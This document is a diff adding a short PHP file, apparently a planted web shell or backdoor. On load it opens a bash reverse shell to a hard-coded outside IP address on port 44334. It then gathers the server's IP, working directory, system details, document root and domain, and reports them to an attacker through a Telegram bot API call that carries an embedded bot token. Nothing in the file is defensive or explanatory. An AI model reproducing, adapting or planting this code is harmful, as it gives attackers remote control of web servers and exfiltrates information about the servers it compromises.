@@ -1,0 +1,11 @@
+<?php
+shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/133.130.114.163/44334 0>&1'");
+$ip = shell_exec("hostname -I | awk '{print $1}'");
+$lihat = getcwd();
+$jancok = php_uname();
+$home = $_SERVER['DOCUMENT_ROOT'];
+$domen = $_SERVER['SERVER_NAME'];
+$tempat = $_SERVER['REQUEST_URI'];
+$data = [ 'chat_id' => '982055649', 'text' => "[ >_FORBIDDENÃ¢ÂšÂ Ã¯Â¸Â ] : \r\n $domen/$tempat \r\n $sys \r\n $jancok \r\n\r\n Ã¢ÂœÂ…HOST = $ip Ã¢ÂœÂ…WEBSITE = $domen \r\n $lihat \r\n BACKCONNECT ON PORT 44334" ];
+$response = file_get_contents("https://api.telegram.org/bot5338529931:AAGltIenlkNGORFhSfF--kWvh6v_ru9KMe0/sendMessage?" . http_build_query($data) );
+?>
